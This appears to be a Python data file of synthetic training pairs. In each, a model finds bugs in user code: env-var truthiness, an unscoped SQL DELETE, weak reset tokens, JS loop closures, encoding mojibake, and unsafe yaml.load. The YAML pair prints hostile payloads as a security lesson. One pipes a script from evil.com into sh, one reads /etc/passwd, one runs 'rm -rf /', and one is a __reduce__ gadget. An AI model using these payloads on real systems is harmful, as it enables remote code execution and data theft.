"""Phase 3A: Metacognition — Error Recognition in Own Output (Part 13)
Scenarios: Wrong error handling, incorrect assumptions, security, logic
Final batch for Phase 3A - covers remaining scenarios to reach 80 pairs.
"""

PAIRS = [
    (
        "thinking/meta-error-env-var-boolean-string",
        r'''I wrote this config check:

```python
import os

FEATURE_ENABLED = os.environ.get("FEATURE_ENABLED", "false")

if FEATURE_ENABLED:
    print("Feature is enabled!")
else:
    print("Feature is disabled.")
```

When I set FEATURE_ENABLED=false, the feature is still enabled! Why?''',
        r'''<think>
Let me trace through this...

`os.environ.get("FEATURE_ENABLED", "false")` returns the STRING `"false"` when the env var is set to `false`.

`if FEATURE_ENABLED:` — this checks the TRUTHINESS of the string `"false"`.

In Python, any non-empty string is truthy. `bool("false")` → `True`!

Only these are falsy: `""` (empty string), `None`, `0`, `False`, `[]`, `{}`.

The string `"false"` is NOT falsy — it's a non-empty string, so it's truthy.

So:
- `FEATURE_ENABLED=true` → `"true"` → truthy → enabled ✓
- `FEATURE_ENABLED=false` → `"false"` → truthy → enabled ✗
- `FEATURE_ENABLED=` (empty) → `""` → falsy → disabled
- `FEATURE_ENABLED` not set → `"false"` (default) → truthy → enabled ✗

The default value `"false"` is also broken — it's truthy! The feature is enabled even when the env var isn't set.

The fix: explicitly compare the string value, not its truthiness.
</think>

**In Python, the string `"false"` is truthy because it's non-empty. `bool("false")` is `True`.**

### The bug
```python
FEATURE_ENABLED = os.environ.get("FEATURE_ENABLED", "false")
# Returns the STRING "false", not the BOOLEAN False

if FEATURE_ENABLED:  # bool("false") → True!
    print("Feature is enabled!")
```

Every non-empty string is truthy in Python: `bool("false")`, `bool("no")`, `bool("0")` are all `True`.

### Fix: explicit string comparison
```python
import os

FEATURE_ENABLED = os.environ.get("FEATURE_ENABLED", "false").lower() == "true"
# Now FEATURE_ENABLED is a real boolean

if FEATURE_ENABLED:
    print("Feature is enabled!")
```

### More robust helper
```python
def env_bool(key: str, default: bool = False) -> bool:
    value = os.environ.get(key)
    if value is None:
        return default
    return value.lower() in ('true', '1', 'yes')

FEATURE_ENABLED = env_bool("FEATURE_ENABLED")  # actual boolean
DEBUG = env_bool("DEBUG", default=False)         # safe default
```

### The meta-lesson
Environment variables are ALWAYS strings. `os.environ.get()` returns a string, not a typed value. You must explicitly convert: `int()` for numbers, `.lower() == "true"` for booleans. Never use truthiness of env var strings — `"false"`, `"0"`, `"no"` are all truthy strings.'''
    ),
    (
        "thinking/meta-error-sql-delete-no-where",
        r'''I wrote this function to delete a user's old notifications:

```python
def cleanup_old_notifications(user_id, days_old=30):
    cutoff = datetime.now() - timedelta(days=days_old)
    db.execute(
        "DELETE FROM notifications WHERE created_at < %s",
        (cutoff,)
    )
    db.commit()
    logger.info(f"Cleaned up old notifications for user {user_id}")
```

I noticed ALL notifications disappeared for ALL users. What went wrong?''',
        r'''<think>
Let me read the SQL carefully...

`DELETE FROM notifications WHERE created_at < %s`

Wait — where's the `user_id` filter? The function takes `user_id` as a parameter but NEVER USES IT in the query! The WHERE clause only filters by `created_at`, so it deletes old notifications for ALL users, not just the specified user.

The `user_id` parameter is used only in the log message — `f"Cleaned up old notifications for user {user_id}"`. So the logs say "cleaned up for user 42" but it actually cleaned up for everyone.

This is a devastating bug:
1. The log message is misleading — it implies scoped deletion
2. The parameter exists, suggesting the developer INTENDED to scope by user
3. The function works "correctly" (no errors) — it just does the wrong thing
4. Every call deletes more data than intended

The fix is trivially adding `AND user_id = %s` to the WHERE clause. But the meta-lesson is about how unused parameters create a false sense of correctness.
</think>

**The `user_id` parameter is never used in the SQL query — it only appears in the log message. The query deletes old notifications for ALL users.**

### The bug
```python
# user_id is accepted but NEVER used in the query:
db.execute(
    "DELETE FROM notifications WHERE created_at < %s",  # no user_id filter!
    (cutoff,)
)
# Log LIES about scope:
logger.info(f"Cleaned up old notifications for user {user_id}")
```

### The fix
```python
def cleanup_old_notifications(user_id, days_old=30):
    cutoff = datetime.now() - timedelta(days=days_old)
    result = db.execute(
        "DELETE FROM notifications WHERE user_id = %s AND created_at < %s",
        (user_id, cutoff)
    )
    db.commit()
    logger.info(f"Deleted {result.rowcount} old notifications for user {user_id}")
```

### Defense-in-depth
```python
# 1. Always log the row count — makes unintended mass deletions obvious
logger.info(f"Deleted {result.rowcount} rows")  # "Deleted 50000 rows" ← alarm!

# 2. Add a safety check for bulk deletes
if result.rowcount > 1000:
    logger.warning(f"Large deletion: {result.rowcount} rows")

# 3. Use soft deletes for critical data
# UPDATE notifications SET deleted_at = NOW() WHERE ...
# Instead of DELETE — recoverable!
```

### The meta-lesson
When a function parameter exists but isn't used in the critical operation, it creates a dangerous illusion of correctness. The function LOOKS correct — it takes `user_id`, it logs `user_id` — but the query ignores it. Always verify that function parameters actually make it into the operations they're supposed to scope. Linters can catch unused variables, but they can't catch variables that are "used" only in log messages.'''
    ),
    (
        "thinking/meta-error-insecure-random-token",
        r'''I generate password reset tokens like this:

```python
import random
import string

def generate_reset_token(length=32):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))
```

32 characters should be secure enough, right?''',
        r'''<think>
Let me analyze the security of this token generation...

The function uses `random.choice()` from Python's `random` module. The `random` module uses the Mersenne Twister PRNG — a pseudorandom number generator that is NOT cryptographically secure.

Why this matters:

1. **Predictable**: Mersenne Twister has an internal state of 624 32-bit integers. If an attacker can observe 624 consecutive outputs, they can reconstruct the full internal state and predict ALL future outputs. For a password reset token of 32 characters, that's 32 random outputs — an attacker needs about 20 tokens to crack the state.

2. **Seeded from time**: By default, `random.seed()` uses the current time. If an attacker knows approximately when the server started, they can brute-force the seed.

3. **Not the token length that matters**: 32 characters from a 62-character alphabet gives 62^32 ≈ 2^190 possible tokens. That's plenty of entropy IF the randomness is truly random. But with a predictable PRNG, the effective entropy is only 19937 bits (Mersenne Twister state size), and after observing a few tokens, it's essentially 0.

The fix: use `secrets` module (Python 3.6+), which uses the OS's cryptographic random source (`/dev/urandom` on Linux, `CryptGenRandom` on Windows).

```python
import secrets
token = secrets.token_urlsafe(32)
```

My error: I assumed "random" means "secure." The `random` module is for simulations and games, not security. For security, you need cryptographic randomness.
</think>

**`random.choice()` uses a predictable PRNG (Mersenne Twister), not cryptographic randomness. An attacker can predict future tokens after observing a few.**

### Why `random` is insecure for tokens
```python
import random

# Mersenne Twister can be cracked:
# 1. Attacker requests ~20 password resets
# 2. Each 32-char token reveals 32 PRNG outputs
# 3. With 624 outputs, attacker reconstructs full PRNG state
# 4. Attacker predicts ALL future tokens

# Worse: if attacker knows server start time:
random.seed(time.time())  # default behavior
# Brute force ~1000 possible seeds per second of uncertainty
```

### Fix: use `secrets` module
```python
import secrets

def generate_reset_token():
    return secrets.token_urlsafe(32)  # 256 bits of cryptographic randomness

# Or for hex tokens:
def generate_reset_token():
    return secrets.token_hex(32)  # 64 hex characters
```

### Python randomness modules
| Module | Source | Use for |
|--------|--------|---------|
| `random` | Mersenne Twister (PRNG) | Simulations, games, shuffling |
| `secrets` | OS cryptographic RNG | Tokens, passwords, keys |
| `os.urandom()` | OS cryptographic RNG | Raw random bytes |

### The meta-lesson
"Random" and "cryptographically random" are completely different. The `random` module generates statistically random numbers (good for Monte Carlo simulations) but they're deterministic given the seed. For anything security-related (tokens, passwords, keys, nonces), always use `secrets` or `os.urandom()`. This is one of the most common security mistakes in Python applications.'''
    ),
    (
        "thinking/meta-error-wrong-scope-closure-loop",
        r'''I wrote this JavaScript code to add click handlers to buttons:

```javascript
const buttons = document.querySelectorAll('.btn');

for (var i = 0; i < buttons.length; i++) {
    buttons[i].addEventListener('click', function() {
        console.log('Button ' + i + ' clicked');
    });
}
```

No matter which button I click, it always logs the last index. Why?''',
        r'''<think>
This is the classic JavaScript closure-in-loop bug.

The problem: `var i` has FUNCTION scope (or global scope), not block scope. The event handler function creates a closure over `i`, but by the time any button is clicked, the loop has finished and `i` equals `buttons.length`.

All handlers share the SAME `i` variable. When clicked:
- Button 0 handler: reads `i` → `buttons.length` (3 if 3 buttons)
- Button 1 handler: reads `i` → `buttons.length` (same `i`!)
- Button 2 handler: reads `i` → `buttons.length` (same `i`!)

The closure captures the VARIABLE `i`, not its VALUE at the time the function was created.

Fix options:
1. Use `let` instead of `var` — `let` has block scope, so each iteration creates a new `i`
2. Use `forEach` which creates a new scope per iteration
3. Use an IIFE to create a new scope

This was such a common bug that `let` was specifically designed to fix it in ES6.
</think>

**`var i` has function scope — all closures share the same `i`, which equals `buttons.length` after the loop ends.**

### What happens
```javascript
// var i is shared across ALL iterations (function scope)
for (var i = 0; i < 3; i++) {
    buttons[i].addEventListener('click', function() {
        console.log(i);  // all closures reference the SAME i
    });
}
// After loop: i = 3
// Click any button → logs 3
```

### Fix 1: `let` (recommended)
```javascript
for (let i = 0; i < buttons.length; i++) {
    buttons[i].addEventListener('click', function() {
        console.log('Button ' + i + ' clicked');
    });
}
// let creates a new i for each iteration — each closure gets its own copy
```

### Fix 2: `forEach` (no index management)
```javascript
buttons.forEach((button, i) => {
    button.addEventListener('click', () => {
        console.log('Button ' + i + ' clicked');
    });
});
```

### Why `let` fixes it
```
var i:  one variable shared across all iterations
        i=0 → i=1 → i=2 → i=3 (loop ends)
        all closures see i=3

let i:  new variable per iteration (block scope)
        i₀=0, i₁=1, i₂=2
        closure 0 sees i₀=0
        closure 1 sees i₁=1
        closure 2 sees i₂=2
```

### The meta-lesson
Closures capture VARIABLES (by reference), not VALUES (by copy). When a closure is created in a loop, it references the loop variable — which keeps changing. `let` in JavaScript and `for x in` in Python (with list comprehensions) create new bindings per iteration. This is one of the most common JavaScript bugs and a core reason `let`/`const` replaced `var`.'''
    ),
    (
        "thinking/meta-error-encoding-mojibake",
        r'''I wrote this file reader that handles different encodings:

```python
def read_file(filepath):
    with open(filepath, 'r') as f:
        return f.read()
```

Some files show garbled characters like "Ã©" instead of "é". What's going on?''',
        r'''<think>
Let me think about encoding issues...

`open(filepath, 'r')` uses the system's DEFAULT encoding. On Linux, this is usually UTF-8. On Windows, it might be CP-1252 or another locale-specific encoding.

The garbled "Ã©" instead of "é" is classic mojibake — UTF-8 bytes interpreted as Latin-1/CP-1252:
- "é" in UTF-8 is the bytes `0xC3 0xA9`
- If those bytes are read as CP-1252: `0xC3` = "Ã", `0xA9` = "©"
- So "é" → "Ã©"

This happens when:
1. The file is saved in UTF-8
2. Python opens it with a non-UTF-8 default encoding (common on Windows)
3. The 2-byte UTF-8 sequence is interpreted as 2 separate Latin-1 characters

The fix: always explicitly specify encoding.

```python
with open(filepath, 'r', encoding='utf-8') as f:
```

But what if the file ISN'T UTF-8? You need to either:
1. Know the encoding in advance (from metadata, BOM, or convention)
2. Detect it with a library like `chardet`
3. Use `errors='replace'` or `errors='ignore'` for best-effort reading

Python 3.15 (PEP 686) will make UTF-8 the default, but until then, you should always specify encoding explicitly.
</think>

**`open()` uses the system's default encoding, which isn't always UTF-8 (especially on Windows). UTF-8 bytes get misinterpreted as Latin-1/CP-1252.**

### The mojibake chain
```
File contains: "café" (UTF-8 bytes: 63 61 66 C3 A9)
                                            ↑ é in UTF-8 = 2 bytes

Python reads with CP-1252 (Windows default):
  C3 → "Ã"
  A9 → "©"

Result: "cafÃ©" instead of "café"
```

### Fix: always specify encoding
```python
def read_file(filepath):
    with open(filepath, 'r', encoding='utf-8') as f:
        return f.read()
```

### For unknown encodings
```python
import chardet

def read_file_auto(filepath):
    # Read as bytes first, detect encoding
    with open(filepath, 'rb') as f:
        raw = f.read()

    detected = chardet.detect(raw)
    encoding = detected['encoding'] or 'utf-8'

    return raw.decode(encoding)
```

### For maximum robustness
```python
def read_file_safe(filepath, encoding='utf-8'):
    try:
        with open(filepath, 'r', encoding=encoding) as f:
            return f.read()
    except UnicodeDecodeError:
        # Fallback: replace undecodable bytes
        with open(filepath, 'r', encoding=encoding, errors='replace') as f:
            return f.read()
```

### The meta-lesson
Never rely on the default encoding — it varies by OS, locale, and Python version. Always pass `encoding='utf-8'` to `open()`. The Unicode sandwich principle: decode bytes to str at input boundaries, work with str internally, encode back to bytes at output boundaries. If you can't control the encoding, detect it before decoding.'''
    ),
    (
        "thinking/meta-error-yaml-load-code-execution",
        r'''I'm loading configuration from a YAML file:

```python
import yaml

def load_config(filepath):
    with open(filepath, 'r') as f:
        return yaml.load(f)
```

I got a deprecation warning. Should I worry?''',
        r'''<think>
This is a major security vulnerability!

`yaml.load()` without a Loader is dangerous because it can execute arbitrary Python code. YAML has tags that trigger object instantiation:

```yaml
# This YAML file executes a system command when loaded!
config: !!python/object/apply:os.system ['rm -rf /']
```

`yaml.load()` processes these tags by default, allowing remote code execution if the YAML file is attacker-controlled (or even if a trusted file is modified).

The deprecation warning is PyYAML's way of pushing users toward safe loaders. The fix:

```python
yaml.safe_load(f)  # or yaml.load(f, Loader=yaml.SafeLoader)
```

`safe_load` only handles basic YAML types (strings, numbers, lists, dicts) and won't execute arbitrary Python objects.

This is similar to Python's `pickle.load()` or `eval()` — never use on untrusted data.
</think>

**`yaml.load()` can execute arbitrary Python code embedded in YAML files. This is a critical remote code execution vulnerability.**

### The attack
```yaml
# malicious_config.yaml
database:
  host: !!python/object/apply:os.system ['curl https://evil.com/shell.sh | sh']
  port: 5432
```

When `yaml.load()` processes this file, it EXECUTES `os.system(...)` — running arbitrary commands on your server.

### Other dangerous YAML payloads
```yaml
# Execute Python code
!!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]

# Import and execute module
!!python/object/new:type
  args: ['exploit', !!python/tuple [], {'__reduce__': !!python/name:os.system}]
```

### Fix: always use safe_load
```python
import yaml

def load_config(filepath):
    with open(filepath, 'r', encoding='utf-8') as f:
        return yaml.safe_load(f)
```

`safe_load` only processes basic YAML types:
- Strings, numbers, booleans
- Lists, dicts
- null/None

It rejects all `!!python/*` tags and custom object construction.

### Similar dangerous deserialization functions
| Dangerous | Safe alternative |
|-----------|-----------------|
| `yaml.load()` | `yaml.safe_load()` |
| `pickle.load()` | Use JSON or protobuf |
| `eval()` | `ast.literal_eval()` |
| `exec()` | Don't |
| `marshal.loads()` | Use JSON |

### The meta-lesson
Deserialization of untrusted data is one of the most dangerous operations in programming. Any format that can represent "objects" or "code" (YAML, pickle, XML with entities) can be weaponized. Always use the restricted/safe variant of deserialization functions, and never deserialize data from untrusted sources without sandboxing.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
